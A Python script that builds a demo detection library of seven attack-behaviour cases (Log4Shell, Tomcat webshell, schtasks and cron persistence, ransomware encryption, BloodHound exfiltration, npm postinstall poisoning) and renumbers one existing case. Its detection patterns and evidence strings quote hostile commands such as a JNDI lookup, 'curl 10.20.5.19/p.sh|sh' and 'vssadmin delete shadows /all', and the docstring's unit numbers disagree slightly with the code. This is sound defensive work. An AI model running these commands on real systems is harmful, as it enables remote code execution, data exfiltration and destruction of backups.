#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""build_demo_library.py —— 按 demo 的 memory-schema 把「每类第 1 个 unit」入库成案例

做四件事（全部按 demo 的 schema/命令语义，不手改 JSON 结构）：
  1) 新增 7 个案例 CASE-001..CASE-007（对应 dataset 每类第 1 组：1001/1021/1041/1061/1081/1101/1121）
  2) 原有 CASE-029 同步改号为 CASE-008（json / raw_logs.csv / links.csv / validation_batches / 文档引用）
  3) raw_logs.csv 追加 7 组已确认观测（case_id 已填），event_pattern_links.csv 追加对应 confirmed 关系
  4) 生成 data/case_id_map.json 记录新旧编号映射

时间戳：保留 unit 内部相对间隔，整体平移到 2026-10-21（与 demo 现有样本同时代）。
内容：原样保留（只做 demo 认可的字段级调整，不改日志正文）。
用法：python eval/usability_ablation/build_demo_library.py [--dry-run]
"""
import argparse
import csv
import json
import pathlib
import re
import shutil
import subprocess
import sys

DEMO = pathlib.Path(__file__).resolve().parents[2] / "demo"
DATASET = DEMO.parent / "dataset"
PATTERNS = DEMO / "data" / "attack_patterns.json"
RAW = DEMO / "data" / "raw_logs.csv"
LINKS = DEMO / "data" / "event_pattern_links.csv"
VB_DIR = DEMO / "data" / "validation_batches"
MAP_PATH = pathlib.Path(__file__).resolve().parent / "case_id_map.json"

OLD_ID, NEW_ID = "CASE-029", "CASE-008"
RAW_FIELDS = ["event_id", "batch_id", "incident_id", "case_id", "timestamp", "source", "log_id", "content"]
LINK_FIELDS = ["event_id", "incident_id", "case_id", "step_id", "action_id", "link_status", "link_basis"]

# ---------------------------------------------------------------- 案例定义
UNITS = [
    (1001, "CASE-001", "F1"),
    (1021, "CASE-002", "F2"),
    (1042, "CASE-003", "F3"),
    (1061, "CASE-004", "F4"),
    (1081, "CASE-005", "FA"),
    (1102, "CASE-006", "FB"),
    (1121, "CASE-007", "FC"),
]

PATTERN_DEFS = {
    "CASE-001": dict(
        name="Log4Shell JNDI 注入（LDAP 回连 + Base64 命令执行）",
        summary="Web 参数注入 ${jndi:ldap://…} → 应用侧 JNDI 解析并回连攻击者 LDAP → 主机侧 java 进程派生子 shell 执行命令。",
        family="Log4j2 JNDI 注入（CVE-2021-44228）",
        variant_note="由单个合成样本归纳；RMI/DNS 协议变体与二次载荷形式尚未多实例验证。",
        mitre=["T1190", "T1059.004", "T1105"],
        steps=[
            ("S1", "initial_access", "log4shell_jndi_param", "Web 参数中的 ${jndi:…} 注入",
             r"(?i)\$\{jndi:(?:ldap|rmi|dns|iiop)://", ["waf", "web"], ["${jndi:ldap://"], False),
            ("S2", "execution", "log4shell_app_jndi_lookup", "应用侧 JNDI 解析并回连",
             r"(?i)\"jndi\"\s*:\s*\"(?:ldap|rmi|dns)://", ["rasp"], ["{\"jndi\": \"ldap://"], True),
            ("S3", "execution", "log4shell_java_child_cmd", "java 进程派生子 shell 执行命令",
             r"(?i)/bin/(?:sh|bash)\s+-c\s+'[^']{1,40}'.{0,80}java(?:\.exe)?\s+-jar", ["hids"],
             ["<== /usr/bin/java -jar"], True),
        ],
        keywords=["jndi:ldap", "auth-service.jar", "uname -a", "base64"],
        probes=[r"\$\{jndi:ldap://", r"\"jndi\"\s*:\s*\"ldap://", r"java(?:\.exe)?\s+-jar\s+/opt/app/"],
        not_observed=["横向移动", "凭据窃取", "反序列化回显"],
    ),
    "CASE-002": dict(
        name="Tomcat PUT 上传 JSP webshell + DNS C2 心跳",
        summary="PUT 方法把 JSP webshell 写入上传目录 → 应用侧记录 webshell 上传与 exec 标记 → Tomcat 进程派生子 shell 执行探针 → 数小时后 DGA 风格域名突发解析。",
        family="Tomcat 任意文件上传（PUT）+ DNS C2",
        variant_note="单样本归纳；webshell 落地路径与 C2 域名均来自该样本，变体形态未验证。",
        mitre=["T1190", "T1505.003", "T1071.004"],
        steps=[
            ("S1", "initial_access", "tomcat_put_jsp_upload", "PUT 写入 JSP webshell",
             r"(?i)/uploads?/[a-z0-9_.-]{1,40}\.jsp/?\s+PUT\b", ["waf", "web"], ["/uploads/cmd.jsp/ PUT"], False),
            ("S2", "execution", "jsp_upload_rce_marker", "应用侧记录 webshell 上传与 exec",
             r"(?i)\"upload\"\s*:\s*\"[a-z0-9_.-]{1,40}\.jsp\".{0,60}\"rce\"", ["rasp"],
             ["{\"upload\": \"cmd.jsp\", \"rce\": \"exec\"}"], False),
            ("S3", "execution", "tomcat_child_id_hostname", "Tomcat 进程派生子 shell 执行探针",
             r"(?i)id;\s*hostname\b.{0,90}catalina\.sh", ["hids"], ["id; hostname"], True),
            ("S4", "command_control", "dga_hex_subdomain_beacon", "DGA 风格子域突发解析",
             r"(?i)\b[0-9a-f]{8}\.[a-z]{6}-[0-9a-f]{4}\.(?:net|com|org|io)\s+A\s+\d", ["dns"],
             ["<8hex>.<6字母>-<4hex>.net A"], True),
        ],
        keywords=["cmd.jsp", "catalina.sh", "id; hostname", "vqmxld"],
        probes=[r"/uploads?/[a-z0-9_.-]+\.jsp/?\s+PUT", r"\"rce\"\s*:\s*\"exec\"",
                r"\b[0-9a-f]{8}\.[a-z]{6}-[0-9a-f]{4}\.net\s+A\b"],
        not_observed=["横向移动", "数据外带内容", "持久化"],
    ),
    "CASE-003": dict(
        name="Windows 计划任务持久化（schtasks 周期拉起载荷）",
        summary="调度接口被注入 schtasks 命令 → 应用侧记录 cmd_inject=schtasks → 主机侧创建周期计划任务执行 C:\\Windows\\Temp 下的载荷。",
        family="Windows 计划任务持久化",
        variant_note="由单个合成样本归纳；任务名/触发间隔/载荷路径均来自该样本，未验证其它调度器变体。",
        mitre=["T1053.005", "T1059.003"],
        steps=[
            ("S1", "initial_access", "scheduler_cmd_inject", "调度接口命令注入（cmd=schtasks）",
             r"(?i)cmd=schtasks\s+/create", ["waf"], ["cmd=schtasks /create"], False),
            ("S2", "execution", "scheduler_cmd_inject_rasp", "应用侧记录 cmd_inject=schtasks",
             r"(?i)\"cmd_inject\"\s*:\s*\"schtasks", ["rasp"], ["{\"cmd_inject\": \"schtasks"], False),
            ("S3", "persistence", "schtasks_interval_task", "创建周期计划任务执行载荷",
             r"(?i)schtasks(?:\.exe)?\s+/create.{0,60}/sc\s+minute", ["hids"], ["/sc minute"], False),
        ],
        keywords=["schtasks /create", "/api/v1/scheduler/run", "cmd_inject"],
        probes=[r"schtasks\s+/create", r"\"cmd_inject\"\s*:\s*\"schtasks", r"/api/v1/scheduler/run"],
        not_observed=["横向移动", "凭据窃取", "载荷内容"],
    ),
    "CASE-004": dict(
        name="Laravel Ignition 反序列化 RCE + cron 持久化",
        summary="请求 _ignition/execute-solution 触发 phar 反序列化 → 应用侧记录 phar:// 载荷 → PHP-FPM 派生子 shell 执行 id → 追加 crontab 定时回连。",
        family="Laravel Ignition 反序列化（CVE-2021-3129）",
        variant_note="单样本归纳；phar 落地路径与持久化命令来自该样本。",
        mitre=["T1190", "T1059.004", "T1053.003"],
        steps=[
            ("S1", "initial_access", "laravel_ignition_execute_solution", "_ignition/execute-solution 触发",
             r"(?i)_ignition/execute-solution", ["waf", "web"], ["_ignition/execute-solution"], False),
            ("S2", "execution", "ignition_phar_deserialization", "应用侧 phar:// 反序列化载荷",
             r"(?i)\"viewfile\"\s*:\s*\"phar://", ["rasp"], ["{\"viewFile\": \"phar://"], False),
            ("S3", "execution", "php_fpm_child_id", "PHP-FPM 派生子 shell 执行命令",
             r"(?i)<==\s*/bin/(?:sh|bash|dash)\s+-c\s+'id'.{0,40}php-fpm", ["hids"],
             ["<== /bin/sh -c 'id' <== php-fpm"], False),
            ("S4", "persistence", "cron_persistence_append", "追加 crontab 定时回连",
             r"(?i)>>\s*/var/spool/cron/root|\(\s*crontab\s+-l", ["hids"], [">> /var/spool/cron/root"], True),
        ],
        keywords=["_ignition", "phar://", "execute-solution", "php-fpm", "/var/spool/cron/root"],
        probes=[r"_ignition/execute-solution", r"phar:///tmp/", r">>\s*/var/spool/cron/root"],
        not_observed=["横向移动", "凭据窃取"],
    ),
    "CASE-005": dict(
        name="勒索式数据破坏：删卷影 + 批量加密",
        summary="上传接口落地 WebShell → 主机侧用 cipher 批量加密共享目录 → 删除全部卷影副本破坏恢复能力（先加密后破坏，与样本时间序一致）。",
        family="勒索与数据破坏（加密 + 恢复能力破坏）",
        variant_note="单样本归纳；样本内部顺序为「加密→删卷影」，与多数勒索链顺序相反，已按观测记录。",
        mitre=["T1486", "T1490", "T1505.003"],
        steps=[
            ("S1", "persistence", "webshell_upload_action", "上传接口落地 WebShell",
             r"(?i)wp-admin/admin-ajax\.php\?action=upload|\"upload\"\s*:\s*\"[a-z0-9_.-]{1,40}\.php\"", ["rasp"],
             ["action=upload"], True),
            ("S2", "impact", "cipher_efs_batch_encrypt", "cipher 批量加密目录",
             r"(?i)(?:^|\s)cipher(?:\.exe)?\s+/e\s+/s:", ["hids"], ["cipher /e /s:"], False),
            ("S3", "impact", "vssadmin_delete_shadows_all", "删除全部卷影副本",
             r"(?i)vssadmin(?:\.exe)?\s+delete\s+shadows\s+/all", ["hids"], ["vssadmin delete shadows /all"], False),
        ],
        keywords=["cipher /e", "vssadmin delete shadows", "action=upload"],
        probes=[r"cipher(?:\.exe)?\s+/e\s+/s:", r"vssadmin(?:\.exe)?\s+delete\s+shadows\s+/all",
                r"action=upload"],
        not_observed=["勒索信", "横向扩散", "备份服务器删除"],
    ),
    "CASE-006": dict(
        name="域内侦察：BloodHound 图谱采集与外传",
        summary="主机侧运行 SharpHound 全量采集 → 压缩采集结果 → 上传到攻击者地址，为后续 Kerberoasting/DCSync 选路。",
        family="AD 域内侦察（BloodHound）",
        variant_note="由单个合成样本归纳；采集参数与上传地址来自该样本，未覆盖其它采集器。",
        mitre=["T1087.002", "T1069.002", "T1560.001"],
        steps=[
            ("S1", "discovery", "sharphound_collect_all", "SharpHound 全量采集",
             r"(?i)sharphound(?:\.exe)?\s+-c\s+all", ["hids"], ["SharpHound.exe -c All"], False),
            ("S2", "collection", "archive_collect_result", "压缩采集结果",
             r"(?i)compress-archive.{0,80}bh_\*", ["hids"], ["Compress-Archive ... bh_*.json"], False),
            ("S3", "exfiltration", "upload_collected_zip", "上传采集压缩包",
             r"(?i)curl(?:\.exe)?\s+-t\s+\S{1,40}\.zip\s+http://", ["hids"], ["curl.exe -T bh.zip"], False),
        ],
        keywords=["sharphound.exe", "compress-archive", "bh.zip", "corp\\jdoe"],
        probes=[r"sharphound(?:\.exe)?\s+-c\s+all", r"compress-archive.{0,80}bh_",
                r"curl(?:\.exe)?\s+-t\s+\S{1,40}\.zip"],
        not_observed=["Kerberoasting", "DCSync", "横向移动"],
    ),
    "CASE-007": dict(
        name="供应链投毒：npm postinstall 钩子执行远程脚本",
        summary="CI 流水线参数触发依赖安装 → 应用侧记录 postinstall 钩子派生 sh → 主机侧 curl 远程脚本并管道执行。",
        family="供应链 / CI 依赖投毒",
        variant_note="单样本归纳；包名与钩子实现来自该样本，其它包管理器生态未验证。",
        mitre=["T1195.002", "T1059.004"],
        steps=[
            ("S1", "initial_access", "ci_pipeline_npm_postinstall", "CI 流水线触发依赖安装",
             r"(?i)(?:hook=postinstall|/api/v\d/pipeline/run)", ["waf", "web"], ["hook=postinstall"], False),
            ("S2", "execution", "npm_lifecycle_postinstall_spawn", "应用侧 postinstall 派生 shell",
             r"(?i)\"npm_lifecycle\"\s*:\s*\"postinstall\"", ["rasp"], ["{\"npm_lifecycle\": \"postinstall\"}"], False),
            ("S3", "execution", "npm_hook_remote_shell", "钩子拉取远程脚本并执行",
             r"(?i)curl\s+\S{1,60}/p\.sh\|sh", ["hids"], ["curl 10.20.5.19/p.sh|sh"], False),
        ],
        keywords=["postinstall", "pipeline/run", "install.js"],
        probes=[r"hook=postinstall", r"\"npm_lifecycle\"\s*:\s*\"postinstall\"",
                r"curl\s+\d{1,3}(?:\.\d{1,3}){3}/p\.sh\|sh"],
        not_observed=["凭据外带", "制品投毒"],
    ),
}


def load_units():
    """取每类第 1 个 unit 的 entries（时间戳平移到 2026-10-21，保留相对间隔）"""
    lab = {}
    for fn in ("parsed_1001_1080.json", "parsed_1081_1140.json"):
        for l in json.loads((DATASET / fn).read_text(encoding="utf-8")):
            lab[l["unit"]] = l
    out = {}
    for base_hour, (uid, cid, fam) in enumerate(UNITS, start=9):
        l = lab[uid]
        entries, first = [], None
        for e in l["entries"]:
            from datetime import datetime, timedelta
            ts = datetime.fromisoformat(e["ts"])
            first = first or ts
            shifted = datetime(2026, 10, 21, base_hour, 0, 0) + (ts - first)
            entries.append(dict(ts=shifted.strftime("%Y-%m-%d %H:%M:%S") + "+08:00",
                                source=e["source"], log_id=e["log_id"], content=e["content"]))
        out[cid] = dict(unit=uid, family=fam, technique=l["technique"], entries=entries)
    return out


def self_check(units):
    """入库前硬校验：schema 之外的语义自检（关键词/探针/每步正则必须命中本案例证据行）"""
    problems = []
    for cid, d in PATTERN_DEFS.items():
        ents = units[cid]["entries"]
        text = "\n".join(e["content"] for e in ents)
        for kw in d["keywords"]:
            if kw.lower() not in text.lower():
                problems.append(f"{cid} 关键词未命中自身证据: {kw!r}")
        for pr in d["probes"]:
            if not re.search(pr, text, re.I):
                problems.append(f"{cid} 探针未命中自身证据: {pr!r}")
        for (sid, _ph, _aid, label, rx, srcs, _ev, _g) in d["steps"]:
            if not any(e["source"] in srcs and re.search(rx, e["content"], re.I) for e in ents):
                problems.append(f"{cid} {sid} 正则未命中任何自身证据行（{label}）")
        if all(st[7] for st in d["steps"]):
            problems.append(f"{cid} 全部步骤都是 generic，永远拿不到 strong")
    if problems:
        raise SystemExit("自检失败：\n  - " + "\n  - ".join(problems))
    print(f"自检通过：{len(PATTERN_DEFS)} 个案例的关键词/探针/正则全部命中自身证据，且都有非通用步")


def build(dry=False):
    units = load_units()
    self_check(units)
    # ---------- 0. 前置检查 ----------
    catalog = json.loads(PATTERNS.read_text(encoding="utf-8-sig"))
    existing = {p["case_id"] for p in catalog["attack_patterns"]}
    if any(cid in existing for cid, _, _ in UNITS):
        sys.exit(f"已存在 {sorted(existing & {c for c,_,_ in UNITS})}，拒绝重复入库")
    if OLD_ID not in existing:
        sys.exit(f"找不到 {OLD_ID}，无法改号；请检查 demo 数据状态")

    # ---------- 1. 案例 JSON ----------
    for p in catalog["attack_patterns"]:
        if p["case_id"] == OLD_ID:
            p["case_id"] = NEW_ID
    for uid, cid, _fam in UNITS:
        d = PATTERN_DEFS[cid]
        steps = []
        for i, (sid, phase, aid, label, rx, srcs, ev, generic) in enumerate(d["steps"], start=1):
            steps.append(dict(step_id=sid, order=i, phase=phase, action_id=aid, label=label,
                              action_regex=rx, expected_sources=srcs, evidence_patterns=ev,
                              generic=generic))
        catalog["attack_patterns"].append(dict(
            schema_version="demo-1.0",
            case_id=cid, pattern_type="attack_behavior_pattern", name=d["name"], summary=d["summary"],
            pattern_scope=dict(attack_family=d["family"], variant_note=d["variant_note"]),
            mitre=d["mitre"], steps=steps,
            retrieval=dict(keywords=d["keywords"], pattern_probes=d["probes"]),
            negative_and_unknown_evidence=dict(not_observed=d["not_observed"],
                                               interpretation="未观察到不等同于确认不存在；需结合日志覆盖范围判断。"),
            provenance=dict(observation_count=1, evidence_status="single_observation_demo",
                            observation_count_note="由 dataset 每类第 1 个 unit 作为首批代表样本入库；原始行保存在 raw_logs.csv。"),
        ))
    catalog["attack_patterns"].sort(key=lambda p: p["case_id"])

    # ---------- 2. raw_logs.csv ----------
    with RAW.open("r", encoding="utf-8-sig", newline="") as fh:
        raw_rows = list(csv.DictReader(fh))
    for r in raw_rows:
        if r["case_id"] == OLD_ID:
            r["case_id"] = NEW_ID
            r["incident_id"] = r["incident_id"].replace("CASE029", "CASE008")
            r["batch_id"] = r["batch_id"].replace("CASE029", "CASE008")
            r["event_id"] = r["event_id"].replace("SIM029", "SIM008")
    new_raw = []
    for uid, cid, _fam in UNITS:
        u = units[cid]
        for i, e in enumerate(u["entries"], start=1):
            new_raw.append(dict(event_id=f"EVT-{cid.replace('-', '')}-{i:02d}",
                                batch_id=f"BATCH-20261021-{cid.replace('-', '')}",
                                incident_id=f"INC-{cid}-001", case_id=cid,
                                timestamp=e["ts"], source=e["source"], log_id=e["log_id"],
                                content=e["content"]))
    raw_rows.extend(new_raw)

    # ---------- 3. event_pattern_links.csv ----------
    with LINKS.open("r", encoding="utf-8-sig", newline="") as fh:
        link_rows = list(csv.DictReader(fh))
    for r in link_rows:
        if r["case_id"] == OLD_ID:
            r["case_id"] = NEW_ID
            r["incident_id"] = r["incident_id"].replace("CASE029", "CASE008")
            r["event_id"] = r["event_id"].replace("SIM029", "SIM008")
            r["link_basis"] = r["link_basis"].replace("CASE-029", "CASE-008")
    new_links = []
    for uid, cid, _fam in UNITS:
        u = units[cid]
        step_by_src = {}
        for (sid, _ph, aid, _lb, _rx, srcs, _ev, _g) in PATTERN_DEFS[cid]["steps"]:
            for s in srcs:
                step_by_src.setdefault(s, (sid, aid))
        for i, e in enumerate(u["entries"], start=1):
            sid, aid = step_by_src[e["source"]]
            new_links.append(dict(event_id=f"EVT-{cid.replace('-', '')}-{i:02d}",
                                  incident_id=f"INC-{cid}-001", case_id=cid, step_id=sid,
                                  action_id=aid, link_status="confirmed",
                                  link_basis=f"{cid} 首批代表样本（dataset unit {uid}，每类第 1 组）"))
    link_rows.extend(new_links)

    # ---------- 4. validation_batches 改名 ----------
    old_vb = VB_DIR / "CASE-029_similar_synthetic.csv"
    new_vb = VB_DIR / "CASE-008_similar_synthetic.csv"
    vb_text = old_vb.read_text(encoding="utf-8-sig").replace("CASE-029", "CASE-008") \
        .replace("CASE029", "CASE008").replace("SIM029", "SIM008")

    # ---------- 5. 文档引用 ----------
    doc_edits = {}
    for p in (DEMO / "README.md", DEMO / "skills" / "attack-memory" / "references" / "runtime-playbook.md",
              DEMO / "src" / "lookup_case_logs.py"):
        t = p.read_text(encoding="utf-8")
        if OLD_ID in t or "CASE029" in t:
            doc_edits[p] = t.replace(OLD_ID, NEW_ID).replace("CASE029", "CASE008")

    if dry:
        print("[dry-run] 将新增案例:", [c for _, c, _ in UNITS])
        print("[dry-run] 改号:", OLD_ID, "->", NEW_ID)
        print("[dry-run] 新增 raw 行:", len(new_raw), "新增 link 行:", len(new_links))
        for cid, u in units.items():
            print(f"   {cid}  unit {u['unit']}  {u['source'] if 'source' in u else ''} lines={len(u['entries'])}  {u['technique'][:40]}")
        return 0

    # ---------- 6. 落盘 ----------
    backup = pathlib.Path(__file__).resolve().parent / "_backup_before_library"
    if backup.exists():
        shutil.rmtree(backup)
    backup.mkdir()
    for p in (PATTERNS, RAW, LINKS):
        shutil.copy2(p, backup / p.name)
    shutil.copy2(old_vb, backup / old_vb.name)

    PATTERNS.write_text(json.dumps(catalog, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    with RAW.open("w", encoding="utf-8-sig", newline="") as fh:
        w = csv.DictWriter(fh, fieldnames=RAW_FIELDS, extrasaction="ignore")
        w.writeheader()
        w.writerows(raw_rows)
    with LINKS.open("w", encoding="utf-8-sig", newline="") as fh:
        w = csv.DictWriter(fh, fieldnames=LINK_FIELDS, extrasaction="ignore")
        w.writeheader()
        w.writerows(link_rows)
    new_vb.write_text(vb_text, encoding="utf-8-sig")
    old_vb.unlink()
    for p, t in doc_edits.items():
        p.write_text(t, encoding="utf-8")
    MAP_PATH.write_text(json.dumps({
        "generated_at": "2026-10-21",
        "note": "demo 案例库改号映射：新增 7 个案例占用 CASE-001..007，原 CASE-029 顺序改号为 CASE-008。",
        "map": {OLD_ID: NEW_ID, **{cid: f"dataset unit {uid}" for uid, cid, _ in UNITS}},
    }, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")

    print(f"已写入：案例 {len(catalog['attack_patterns'])} 个 · raw 行 {len(raw_rows)} · link 行 {len(link_rows)} · 文档更新 {len(doc_edits)} 处")
    return 0


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--dry-run", action="store_true")
    sys.exit(build(ap.parse_args().dry_run))
